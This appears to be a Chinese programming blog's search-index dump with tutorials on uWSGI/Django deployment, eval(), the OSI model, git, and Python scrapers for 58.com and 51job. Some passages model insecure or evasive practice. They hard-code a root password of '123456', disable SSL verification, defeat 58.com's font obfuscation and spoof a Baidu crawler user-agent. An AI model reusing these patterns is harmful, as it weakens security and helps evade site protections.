[(&#x27;Content-Type&#x27;,&#x27;text/html;charset=utf-8&#x27;)]) return [bytes(&#x27;你好啊！！&#x27;,&#x27;utf-8&#x27;),b&#x27;Mr_lee&#x27;] # 基于wsgi协议规范实现的代码 启动uWSGI服务器，并部署hello.py程序 uwsgi --http 192.168.248.128:8001 --wsgi-file hello.py #注意hilo.py可以写成绝对路径 浏览器访问：192.168.248.128:8001 3、 uWSGI部署django项目 在数据库中建好项目需要的database：“ems” 使用Navicat创建即可,注意字符集为 utf8 在Django项目的settings.py中修改配置 12345678910111213DEBUG = False #去掉开发模式 ALLOWED_HOSTS = [&quot;*&quot;] #开放访问hostDATABASES = &#123; #合适数据库参数 &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;ems&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125; 发送项目到linux并做移植 python manage.py makemigrations python manage.py migrate 编写uWSGI的配置文件 12345678910111213141516171819202122232425#随意找一个目录，创建一个文件：config.ini -- 建议放在项目的根目录下[uwsgi]http = 192.168.134.128:9000 # uWSGI服务器访问地址#uWSGI和nginx通信的portsocket = 192.168.134.128:9001# the base directory (full path)chdir = /usr/local/django_projects/ems #项目所在目录# Django&#x27;s wsgi filewsgi-file = ems/wsgi.py #基于项目目录的相对路径# maximum number of worker processesprocesses = 4#thread numbers startched in each worker processthreads = 2#monitor uwsgi status 通过该端口可以监控 uwsgi 的负载情况stats = 192.168.134.128:9002# clear environment on exitvacuum = truepidfile = /usr/local/django_projects/ems/uwsgi.pid #进程ID存放于此文件，位置可以自定义#daemonize-run ,file-to-record-logdaemonize = /usr/local/django_projects/ems/uwsgi.log #后台启动模式，日志文件记录位置自定义#http://ip:port/static/...请求会进入该目录找资源，此处可以指向某个app下的static目录#或是将所有静态文件汇总到项目的某一个目录下，然后配置在此是更好的选择#汇集所有已安装app的静态资源到一个目录下，请参见后续内容#http://ip:port/static/a/b/c/d.png ==&gt; /usr/local/xxxx/static/a/b/c/d.pngstatic-map =/static=/usr/local/xxx/static # 只在你写的static-map中找静态资源 根据如上配置启动uWSGI服务器 uwsgi --ini config.ini #注意：config.ini是一个相对路径 关闭服务器 uwsgi --stop uwsgi.pid #通过进程id文件 使用uwsgi服务器运行项目后，出现静态资源无法加载的问题 123456# 分析原因： 1.在django内置的服务器中，调试模式，django查找静态资源默认在每个app的static目录 2. 或者可以在setting.py文件中 STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;)] 将项目根目录下的static目录作为静态资源的查找路径 # 但是uwsgi服务器有自己的静态资源的处理方式，也就是它不会在上述的两个地方查找静态资源 uwsgi如何处理静态资源 1234567891011121314# 在config.ini配置文件的最后面来告诉uwsgi服务器要在哪里去找静态资源[uwsig]http = xxx:9000socket = xxx:9001.........# 写你的静态资源的绝对路径，如果在项目根目录下，直接写项目根目录/static即可# 如果是每个app自己管理，把所有的app的static目录添加进来，有几个app加几个static-mapstatic-map=/static=/usr/local/xxx/static url可以分为两大类：1. 普通url-动态资源url 会在urls.py文件中匹配访问路径 最终找到视图函数2. 静态资源url-- /static/ 告诉django当url中有/static/时django会在静态资源的目录下去查找资源 如果你的app过多，每个app自己管理静态资源，此时需要添加的static-map太多 123456# 只需要做两步操作就可以把所有app下的静态资源static目录的文件收集到某一个目录下1. 在项目的setting.py文件中添加 STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) 用于告诉django，将来收集到的静态资源往哪里放 2. 执行收集的指令 python manage.py collectstatic STATIC_URL &#x3D; ‘&#x2F;static&#x2F;‘ # 每个静态资源URL的访问前缀 STATICFIELS_DIRS &#x3D; [os.path.join(BASE_DIR,’static’)] # 添加django内置服务器查找静态资源的路径 STATIC_ROOT &#x3D; os.path.join(BASE_DIR,’static’) # 收集静态资源时的路径 static-map&#x3D;&#x2F;static&#x3D;xxxx # 告诉uwsgi服务器到哪里去找静态资源","categories":[],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"http://example.com/tags/Nginx/"}]},{"title":"eval()函数","slug":"eval-函数","date":"2020-10-29T02:44:14.000Z","updated":"2022-04-08T14:29:40.249Z","comments":true,"path":"2020/10/29/eval-函数/","permalink":"http://example.com/2020/10/29/eval-%E5%87%BD%E6%95%B0/","excerpt":"1.eval()函数","text":"1.eval()函数 python中eval()函数用来执行一个字符串的表达式,并返回表达式的值 123456789eval(expression[,globals[,locals]])expression --- 表达式globals -- 变量作用域,全局的命名空间,若提供必须时字典对象locals--变量作用域,可以是任何映射对象返回 表达式计算的结果 javaScript eval()函数 1234567eval(string)函数可以计算某个字符串,并执行其中的JavaScirpt代码string必须,要计算的字符串,其中含有要计算的JavaScript表达式如果参数中没有合法的表达式和语句，则抛出 SyntaxError 异常。如果非法调用 eval()，则抛出 EvalError 异常。如果传递给 eval() 的 Javascript 代码生成了一个异常，eval() 将把该异常传递给调用者。","categories":[],"tags":[{"name":"eval","slug":"eval","permalink":"http://example.com/tags/eval/"}]},{"title":"七层网络结构","slug":"七层网络结构","date":"2020-10-29T00:33:29.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/29/七层网络结构/","permalink":"http://example.com/2020/10/29/%E4%B8%83%E5%B1%82%E7%BD%91%E7%BB%9C%E7%BB%93%E6%9E%84/","excerpt":"计算机网络七层网络结构","text":"计算机网络七层网络结构 计算机网络七层网络结构7层是指OSI七层协议模型，主要是：应用层（Application）、表示层（Presentation）、会话层（Session）、传输层（Transport）、网络层（Network）、数据链路层（Data Link）、物理层（Physical）。 OSI 模型 主要协议 单位 TCP&#x2F;IP 应用层 Telnet、FTP、HTTP、SNMP等 数据流 应用层 表示层 CSS GIF HTML JSON XML GIF 数据流 会话层 FTP SSH TLS HTTP(S) SQL 数据流 传输层 TCP UDP 数据段 传输层 网络层 IP(IPV4、IPV6) ICMP 数据包 网际层 数据链路层 802.2、802.3ATM、HDLC、 帧 网络接口层 物理层 V.35、EIA&#x2F;TIA-232 比特流 结构名 功能 主要设备 应用层 确定通信对象，提供访问网络服务的接口 网关 表示层 负责数据的编码、转化（界面与二进制数据转换，高级语言与机器语言的转换）数据压缩、解压，加密、解密。根据不同应用目的处理为不同的格式，表现出来就是我们看到的各种各样的文件扩展名。 网关 会话层 负责建立、维护、控制会话单工(Simplex)、半双工(Half duplex)、全双工(Full duplex)三种通信模式的服务 网关 传输层 负责分割、组合数据，实现端到端的逻辑连接三次握手(Three-way handshake)，面向连接(Connection-Oriented)或非面向连接(Connectionless-Oriented)的服务，流控(Flow control)等都发生在这一层。是第一个端到端，即主机到主机的层次。 网关 网络层 负责管理网络地址，定位设备，决定路由 路由器，网桥路由器 数据链路层 负责准备物理传输，CRC校验，错误通知，网络拓扑，流控等 交换机、网桥、网卡 物理层 就是实实在在的物理链路，负责将数据以比特流的方式发送、接收 集线器、中继器,电缆，发送器，接收器 协议间的传输","categories":[],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"requests发送https请求(处理ssl证书验证)","slug":"requests发送https请求-处理ssl证书验证","date":"2020-10-29T00:28:24.000Z","updated":"2022-04-08T14:29:40.265Z","comments":true,"path":"2020/10/29/requests发送https请求-处理ssl证书验证/","permalink":"http://example.com/2020/10/29/requests%E5%8F%91%E9%80%81https%E8%AF%B7%E6%B1%82-%E5%A4%84%E7%90%86ssl%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81/","excerpt":"requests发送https请求(处理ssl证书验证)","text":"requests发送https请求(处理ssl证书验证) 1、SSL是什么，为什么发送HTTPS请求时需要证书验证？ 1234567891011121.1 SSL：安全套接字层。是为了解决HTTP协议是明文，避免传输的数据被窃取，篡改，劫持等。1.2 TSL：Transport Layer Security，传输层安全协议。TSL其实是SSL标准化后的产物，即SSL／TSL实际上是一个东西。 1.3 HTTPS：HTTPS是兼容HTTP的，可以把HTTPS理解为&#x27;HTTP over TSL&#x27;，即HTTPS是HTTP协议和TSL协议的组合。1.4 HTTPS在传输数据时，同样会先建立TCP连接，建立起TCP连接后，会建立TSL连接. 1.5 请求可以为HTTPS请求验证SSL证书，就像web浏览器一样，SSL验证默认是开启的， 如果证书验证失败，请求会抛出SSLError: 12345&gt;&gt;&gt;import requests&gt;&gt;&gt;requests.get(&#x27;https:xxxx.com&#x27;) #发起一个https请求&gt;&gt;&gt;requests.exceptions.SSLError: xx 1.7 HTTPS请求进行SSL验证或忽略SSL验证才能请求成功，忽略方式为verify=False","categories":[],"tags":[{"name":"requests","slug":"requests","permalink":"http://example.com/tags/requests/"}]},{"title":"git 的入门","slug":"day1","date":"2020-10-19T10:51:58.000Z","updated":"2024-10-26T09:17:10.390Z","comments":true,"path":"2020/10/19/day1/","permalink":"http://example.com/2020/10/19/day1/","excerpt":"","text":"版本控制工具的介绍![2020-10-19_110709](E:\\05 web进阶\\day1\\图片\\2020-10-19_110709.png) git 的入门1234567891011121314151617181920212223242526271. 自报家门 git config --global user.name &quot;maoxy-python&quot; git config --global user.email &quot;maoxy@zparkhr.com.cn&quot;2. 创建版本库 git init 3. 添加文件到git的版本库 git add 文件名 将文件添加到版本库中 暂存区 git commit 文件名 确定添加到版本库(会弹出vi界面添加本次操作的版本说明) git commit -m &quot;版本说明&quot; 确定添加到版本库,不会弹出vi界面 (推荐) 4. 仓库的状态 git status 红色: 文件发生了修改 但是未添加到版本库 绿色: 文件的修改已经添加到了版本库 但没有提交 nothing to commit, working tree clean: 当前仓库状态正常 5. 查看git的历史记录 git log git log --pretty=oneline 以更简洁的形式查看记录 (推荐) 6. 版本回退 git reset --hard 版本号7. 显示所有的历史操作 git reflog git的仓库说明![2020-10-19_140909](E:\\05 web进阶\\day1\\图片\\2020-10-19_140909.png) git的撤销修改123456789101. 工作区文件撤销 git checkout -- 文件名 2. 暂存区文件撤销 a. 先将暂存区的文件状态撤回到工作区 git reset head 文件名 b. 将工作区的文件状态撤销 git checkout -- 文件名 3. 文件状态一旦提交到master 无法彻底删除 git的删除1234567891. 删除文件 rm 文件名|目录名 此时会记录删除的动作 2. 确定删除 git rm 文件名 git commit -m &quot;版本说明&quot; 文件名3. 取消删除 git checkout -- 文件名 git reset head 文件名 分支的使用1234567891011121314151617181920212223241. 创建分支 git branch 分支名 只创建分支 git checkout -b 分支名 创建并切换到分支 2. 查看分支 git branch 3. 切换分支 git checkout 分支名4. 合并分支 git merge 分支名 注意: 向谁合并需要先切换到谁 5. 删除分支 git branch -d 分支名 6. 分支相关命令 git branch --help 7. 合并分支发生冲突 1. 编辑发生冲突的文件 2. git add 3. git commit 远程仓库123456789101112131415161718192021222324252627282930313233341. 创建账号码云|GitHub2. 创建仓库 https://github.com/maoxy-python/dangdang2006.git 3. 将本地版本库与远程仓库连接 git remote add origin 远程仓库地址 4. 查看绑定是否成功 git remote -v 5. 向远程仓库推送本地仓库 git push -u origin master 每次绑定地址后第一次推送 6. 克隆仓库 git clone 远程仓库地址 7. 删除绑定的远程仓库地址 git remote remove origin 8. 免密访问 a. 解除原有地址,切换成ssh地址 b. 生成ssh公私钥 ssh-keygen -t rsa -C &quot;GitHub的邮箱名&quot; 连续四次enter即可 C:\\Users\\Administrator\\.ssh\\ 目录下找到公私钥 id_rsa私钥 id_rsa.pub公钥 打开公钥,将公钥的内容拷贝纸github 9. 推送自己的分支 git push origin 分支名 切换到该分支上执行 git push -d origin dev 删除远程分支 10. 推送远程仓库发生冲突 a.将冲突拉取至本地 git pull pycharm集成终端![集成git终端](E:\\05 web进阶\\day1\\图片\\集成git终端.png) 作业11. 掌握git的命令使用","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://example.com/tags/git/"}]},{"title":"让别人连接自己的mysql","slug":"让别人连接自己的mysql","date":"2020-10-15T08:59:24.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/15/让别人连接自己的mysql/","permalink":"http://example.com/2020/10/15/%E8%AE%A9%E5%88%AB%E4%BA%BA%E8%BF%9E%E6%8E%A5%E8%87%AA%E5%B7%B1%E7%9A%84mysql/","excerpt":"让别人连接自己的mysql","text":"让别人连接自己的mysql 修改mysql中mysql databa下的user表","categories":[],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"}]},{"title":"58同城一线城市买房信息数据可视化","slug":"58同城一线城市买房信息数据可视化","date":"2020-10-13T12:01:50.000Z","updated":"2022-04-08T14:29:40.218Z","comments":true,"path":"2020/10/13/58同城一线城市买房信息数据可视化/","permalink":"http://example.com/2020/10/13/58%E5%90%8C%E5%9F%8E%E4%B8%80%E7%BA%BF%E5%9F%8E%E5%B8%82%E4%B9%B0%E6%88%BF%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/","excerpt":"使用pyecarts进行数据可视化 官方网站 https://gallery.pyecharts.org/#/","text":"使用pyecarts进行数据可视化 官方网站 https://gallery.pyecharts.org/#/ 58同城一线城市买房信息数据可视化1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# _*_coding:UTF-8 _*_import MySQLdbfrom pyecharts import optionsfrom pyecharts.charts import Bar, Pie, Pagefrom pyecharts.globals import ThemeTypecity_list = [&#x27;北京&#x27;, &#x27;天津&#x27;, &#x27;上海&#x27;, &#x27;南京&#x27;, &#x27;大连&#x27;, &#x27;成都&#x27;, &#x27;无锡&#x27;, &#x27;昆明&#x27;, &#x27;杭州&#x27;, &#x27;武汉&#x27;, &#x27;西安&#x27;, &#x27;重庆&#x27;, &#x27;长沙&#x27;]def select_average_price(): average_list = [] conn = MySQLdb.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;, charset=&#x27;utf8&#x27;) cursor = conn.cursor() for city in city_list: sql = &#x27;select every_price from 58tc_xinfang where city=&quot;&#123;&#125;&quot;&#x27;.format(city) cursor.execute(sql) price_list = cursor.fetchall() sum_price = 0 number = len(price_list) for price in price_list: sum_price += int(price[0].replace(&#x27;元/㎡&#x27;, &#x27;&#x27;)) average = sum_price / number average_list.append(format(average, &#x27;.2f&#x27;)) return average_listprice_list = select_average_price()print(price_list)# 柱状图bar_obj = ( Bar(init_opts=options.InitOpts(theme=ThemeType.MACARONS)) \\ .add_xaxis((city_list)) \\ .add_yaxis(&quot;&quot;, price_list) \\ .set_global_opts(title_opts=options.TitleOpts(&quot;买房平均价格元/㎡&quot;, subtitle=&#x27;仅供参考&#x27;), toolbox_opts=options.ToolboxOpts(), # 工具栏选项 brush_opts=options.BrushOpts() # 工具刷对象 ))# 饼状图b_list = [list(i) for i in zip(city_list, price_list)]pie_ogj = ( Pie() .add(&quot;&quot;, b_list) .set_series_opts(label_opts=options.LabelOpts(formatter=&quot;&#123;b&#125;: &#123;c&#125;&quot;)))# page对象用于整合地图p = Page(layout=Page.SimplePageLayout)p.add(pie_ogj, bar_obj)p.render(&quot;一线城市买房信息整合.html&quot;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"58同城一线城市房源信息","slug":"58同城一线城市房源信息","date":"2020-10-13T08:07:58.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/10/13/58同城一线城市房源信息/","permalink":"http://example.com/2020/10/13/58%E5%90%8C%E5%9F%8E%E4%B8%80%E7%BA%BF%E5%9F%8E%E5%B8%82%E6%88%BF%E6%BA%90%E4%BF%A1%E6%81%AF/","excerpt":"58同城一线城市房源信息爬取,并存放数据库","text":"58同城一线城市房源信息爬取,并存放数据库 58同城一线城市租房房源信息需要处理58同城的加密字体,买房无加密. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137import requestsimport timeimport base64import pymysqlfrom lxml import etreefrom fontTools.ttLib import TTFontheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36&#x27;&#125;# 获取字体文件并转换为xml文件def get_font(page_url, page_num): response = requests.get(url=page_url, headers=headers) # 匹配 base64 编码的加密字体字符串 base64_string = response.text.split(&quot;base64,&quot;)[1].split(&quot;&#x27;&quot;)[0].strip() # print(base64_string) # 将 base64 编码的字体字符串解码成二进制编码 bin_data = base64.decodebytes(base64_string.encode()) # 保存为字体文件 with open(&#x27;58font.woff&#x27;, &#x27;wb&#x27;) as f: f.write(bin_data) print(&#x27;第&#x27; + str(page_num) + &#x27;次访问网页，字体文件保存成功！&#x27;) # 获取字体文件，将其转换为xml文件 font = TTFont(&#x27;58font.woff&#x27;) font.saveXML(&#x27;58font.xml&#x27;) print(&#x27;已成功将字体文件转换为xml文件！&#x27;) return response.text# 将加密字体编码与真实字体进行匹配def find_font(): # 以glyph开头的编码对应的数字 glyph_list = &#123; &#x27;glyph00001&#x27;: &#x27;0&#x27;, &#x27;glyph00002&#x27;: &#x27;1&#x27;, &#x27;glyph00003&#x27;: &#x27;2&#x27;, &#x27;glyph00004&#x27;: &#x27;3&#x27;, &#x27;glyph00005&#x27;: &#x27;4&#x27;, &#x27;glyph00006&#x27;: &#x27;5&#x27;, &#x27;glyph00007&#x27;: &#x27;6&#x27;, &#x27;glyph00008&#x27;: &#x27;7&#x27;, &#x27;glyph00009&#x27;: &#x27;8&#x27;, &#x27;glyph00010&#x27;: &#x27;9&#x27; &#125; # 十个加密字体编码 unicode_list = [&#x27;0x9476&#x27;, &#x27;0x958f&#x27;, &#x27;0x993c&#x27;, &#x27;0x9a4b&#x27;, &#x27;0x9e3a&#x27;, &#x27;0x9ea3&#x27;, &#x27;0x9f64&#x27;, &#x27;0x9f92&#x27;, &#x27;0x9fa4&#x27;, &#x27;0x9fa5&#x27;] num_list = [] # 利用xpath语法匹配xml文件内容 font_data = etree.parse(&#x27;./58font.xml&#x27;) for unicode in unicode_list: # 依次循环查找xml文件里code对应的name result = font_data.xpath(&quot;//cmap//map[@code=&#x27;&#123;&#125;&#x27;]/@name&quot;.format(unicode))[0] # print(result) # 循环字典的key，如果code对应的name与字典的key相同，则得到key对应的value for key in glyph_list.keys(): if key == result: num_list.append(glyph_list[key]) print(&#x27;已成功找到编码所对应的数字！&#x27;) # print(num_list) # 返回value列表 return num_list# 替换掉网页中所有的加密字体编码def replace_font(num, page_response): # 9476 958F 993C 9A4B 9E3A 9EA3 9F64 9F92 9FA4 9FA5 result = page_response.replace(&#x27;&amp;#x9476;&#x27;, num[0]).replace(&#x27;&amp;#x958f;&#x27;, num[1]).replace(&#x27;&amp;#x993c;&#x27;, num[2]).replace( &#x27;&amp;#x9a4b;&#x27;, num[3]).replace(&#x27;&amp;#x9e3a;&#x27;, num[4]).replace(&#x27;&amp;#x9ea3;&#x27;, num[5]).replace(&#x27;&amp;#x9f64;&#x27;, num[6]).replace( &#x27;&amp;#x9f92;&#x27;, num[7]).replace(&#x27;&amp;#x9fa4;&#x27;, num[8]).replace(&#x27;&amp;#x9fa5;&#x27;, num[9]) print(&#x27;已成功将所有加密字体替换！&#x27;) return result# 提取租房信息def parse_pages(pages): num = 0 ele = etree.HTML(pages) city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) rooms = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;room&quot;]/text()&#x27;) address = ele.xpath(&#x27;//div[@class=&quot;des&quot;]/p[@class=&quot;infor&quot;]/a/text()&#x27;) price = ele.xpath(&#x27;//div[@class=&quot;money&quot;]/b/text()&#x27;) print(len(title)) for i in title: index = title.index(i) try: if title[index] == &#x27;&#x27;: title[index] == &#x27;无&#x27; data = [title[index].split(&#x27;\\n&#x27;)[1].strip(), rooms[index].replace(&#x27; &#x27;, &#x27;&#x27;), address[index * 2] + &quot; &quot; + address[index * 2 + 1], price[index] + &#x27;元/月&#x27;, city] num += 1 except Exception as e: print(e) save_to_mysql(data) print(&#x27;第&#x27; + str(num) + &#x27;条数据爬取完毕，暂停1.5秒！&#x27;) time.sleep(2)# 创建MySQL数据库的表：58tc_datadef create_mysql_table(): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;CREATE TABLE IF NOT EXISTS 58tc_zufang (title VARCHAR(100) PRIMARY KEY,rooms VARCHAR(255) NOT NULL, address VARCHAR(100) ,price VARCHAR(255),city VARCHAR(255) )&#x27; cursor.execute(sql) db.close()# 将数据储存到MySQL数据库def save_to_mysql(data): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;INSERT INTO 58tc_zufang(title,rooms,address,price,city) values(%s, %s, %s, %s,%s)&#x27; try: cursor.execute(sql, (data[0], data[1], data[2], data[3], data[4])) db.commit() except Exception as e: print(e) db.rollback() db.close()if __name__ == &#x27;__main__&#x27;: create_mysql_table() print(&#x27;MySQL表58tc_data创建成功！&#x27;) city_list = [&#x27;gz&#x27;, &#x27;zz&#x27;, &#x27;dg&#x27; ,&#x27;fs&#x27;,&#x27;sh&#x27;,&#x27;bj&#x27;,&#x27;nj&#x27;,&#x27;dl&#x27;,&#x27;tj&#x27;,&#x27;nb&#x27;,&#x27;cd&#x27;,&#x27;wx&#x27;,&#x27;hz&#x27;,&#x27;wh&#x27;,&#x27;sy&#x27;,&#x27;sz&#x27;,&#x27;xa&#x27;,&#x27;cq&#x27;,&#x27;cs&#x27;,&#x27;qd&#x27;,] for city in city_list: for i in range(10, 25): url = (&#x27;https://&#123;&#125;.58.com/chuzu/pn&#x27; + str(i) + &#x27;/&#x27;).format(city) print(url) response = get_font(url, i) num_list = find_font() pro_pages = replace_font(num_list, response) parse_pages(pro_pages) print(&#x27;第&#x27; + str(i) + &#x27;页数据爬取完毕！&#x27;) # time.sleep(random.randint(3, 10)) print(&#x27;所有数据爬取完毕！&#x27;) 买房(二手房)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# _*_coding:UTF-8 _*_import requestsimport timeimport pymysqlfrom lxml import etreeheaders = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&#x27;&#125;# 提取租房信息def parse_pages(pages): num = 0 ele = etree.HTML(pages) try: city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) print(len(title)) sum_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;sum&#x27;]/b/text()&quot;) evey_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;unit&#x27;]/text()&quot;) except: time.sleep(60 * 5) print(&quot;出现验证码,5分钟后操作&quot;) city = ele.xpath(&#x27;//head/title/text()&#x27;)[0].split(&#x27;-&#x27;)[1][:-4] title = ele.xpath(&#x27;//h2/a/text()&#x27;) print(len(title)) sum_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;sum&#x27;]/b/text()&quot;) evey_price = ele.xpath(&quot;//div[@class=&#x27;price&#x27;]/p[@class=&#x27;unit&#x27;]/text()&quot;) for i in title: index = title.index(i) try: data = [title[index].split(&#x27;\\/xa0&#x27;)[0], sum_price[index] + &#x27;万&#x27;, evey_price[index], city] num += 1 save_to_mysql(data) print(&#x27;第&#x27; + str(num) + &#x27;条数据爬取完毕，暂停1.5秒！&#x27;) time.sleep(1.5) except Exception as e: print(e)# 创建MySQL数据库的表：58tc_datadef create_mysql_table(): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;CREATE TABLE IF NOT EXISTS 58tc_xinfang (title VARCHAR(100) PRIMARY KEY,sum_price VARCHAR(255), every_price VARCHAR(100) ,city VARCHAR(255) )&#x27; cursor.execute(sql) db.close()# 将数据储存到MySQL数据库def save_to_mysql(data): db = pymysql.connect(host=&#x27;localhost&#x27;, user=&#x27;root&#x27;, password=&#x27;123456&#x27;, port=3306, db=&#x27;spider&#x27;) cursor = db.cursor() sql = &#x27;INSERT INTO 58tc_xinfang(title,sum_price,every_price,city) values(%s, %s, %s, %s)&#x27; try: cursor.execute(sql, (data[0], data[1], data[2], data[3])) db.commit() except Exception as e: print(e) db.rollback() db.close()if __name__ == &#x27;__main__&#x27;: # create_mysql_table() # print(&#x27;MySQL表58tc_xifang创建成功！&#x27;) city_list = [&#x27;fs&#x27;, &#x27;gz&#x27;, &#x27;zz&#x27;, &#x27;dg&#x27;, &#x27;sh&#x27;, &#x27;bj&#x27;, &#x27;nj&#x27;, &#x27;dl&#x27;, &#x27;tj&#x27;, &#x27;nb&#x27;, &#x27;cd&#x27;, &#x27;wx&#x27;, &#x27;hz&#x27;, &#x27;wh&#x27;, &#x27;sy&#x27;, &#x27;sz&#x27;, &#x27;xa&#x27;, &#x27;cq&#x27;, &#x27;cs&#x27;, &#x27;qd&#x27;] for city in city_list: for i in range(1, 20): url = (&#x27;https://&#123;&#125;.58.com/ershoufang/pn&#x27; + str(i) + &#x27;/&#x27;).format(city) print(url) pro_pages = requests.get(url).text parse_pages(pro_pages) print(&#x27;第&#x27; + str(i) + &#x27;页数据爬取完毕！&#x27;) # time.sleep(random.randint(3, 10)) print(&#x27;所有数据爬取完毕！&#x27;)","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"进程池和线程池爬取51job","slug":"进程池和线程池爬取51job","date":"2020-10-12T13:28:27.000Z","updated":"2022-04-08T14:29:40.281Z","comments":true,"path":"2020/10/12/进程池和线程池爬取51job/","permalink":"http://example.com/2020/10/12/%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%88%AC%E5%8F%9651job/","excerpt":"python 进程池和线程池学习","text":"python 进程池和线程池学习 进程池和线程池爬取51job进程池爬取1234567891011121314151617181920212223242526from multiprocessing import Pool # 进程池import requestsimport jsonimport redef run(page): print(&quot;开始爬取&quot;) for i in range(1, page): url = &quot;https://search.51job.com/list/010000,000000,0000,00,9,99,%25E9%2594%2580%25E5%2594%25AE,2,&#123;&#125;.html?lang=c&amp;postchannel=0000&amp;workyear=99&amp;cotype=99&amp;degreefrom=99&amp;jobterm=99&amp;companysize=99&amp;ord_field=0&amp;dibiaoid=0&amp;line=&amp;welfare=&quot;.format( i) res = requests.get(url, headers=&#123;&#x27;user-agent&#x27;: &quot;baiduspider&quot;&#125;).text rule = &#x27;__SEARCH_RESULT__ = (.*?)&lt;/script&gt;&#x27; job_dict = json.loads(re.findall(rule, res)[0]) for job in job_dict[&#x27;engine_search_result&#x27;]: if not job[&#x27;providesalary_text&#x27;]: job[&#x27;providesalary_text&#x27;] = &quot;面议&quot; print(job[&#x27;job_name&#x27;], job[&#x27;providesalary_text&#x27;])if __name__ == &#x27;__main__&#x27;: pool = Pool(10) for i in range(100): pool.apply_async(run, (i,)) pool.close() pool.join() print(&quot;爬取结束&quot;) 线程池爬取123456789101112131415161718192021import requestsimport jsonimport refrom concurrent.futures import ThreadPoolExecutordef run(url): print(&quot;开始爬取&quot;) res = requests.get(url, headers=&#123;&#x27;user-agent&#x27;: &quot;baiduspider&quot;&#125;).text rule = &#x27;__SEARCH_RESULT__ = (.*?)&lt;/script&gt;&#x27; job_dict = json.loads(re.findall(rule, res)[0]) for job in job_dict[&#x27;engine_search_result&#x27;]: if not job[&#x27;providesalary_text&#x27;]: job[&#x27;providesalary_text&#x27;] = &quot;面议&quot; print(job[&#x27;job_name&#x27;], job[&#x27;providesalary_text&#x27;])if __name__ == &#x27;__main__&#x27;: pool = ThreadPoolExecutor(max_workers=10) for i in range(1, 1000): url = &quot;https://search.51job.com/list/010000,000000,0000,00,9,99,%25E9%2594%2580%25E5%2594%25AE,2,&#123;&#125;.html?lang=c&amp;postchannel=0000&amp;workyear=99&amp;cotype=99&amp;degreefrom=99&amp;jobterm=99&amp;companysize=99&amp;ord_field=0&amp;dibiaoid=0&amp;line=&amp;welfare=&quot;.format( i) pool.submit(run, url) 注意​ 1、多线程适合IO密集型程序 2、多进程适合CPU密集运算型程序 协程：通俗的讲就是比线程还要小的线程，所以才叫微线程。 协程,也叫微线程,纤程 协程是抽象的–&gt;没有协程对象 协程的作用在于协调程序的执行 如果程序运行过程中出现问题,可以切换到另一个执行线路上. 协程实现的关键点是:挂起 yield 123456优点： 1、使用高并发、高扩展、低性能的；一个CPU支持上万的协程都不是问题。所以很适合用于高并发处理。 2、无需线程的上下文切换开销（乍一看，什么意思呢？我们都知道python实际上是就是单线程，那都是怎么实现高并发操作呢，就是CPU高速的切换，每个任务都干一点，最后看上去是一起完事儿的，肉眼感觉就是多线程、多进程）缺点： 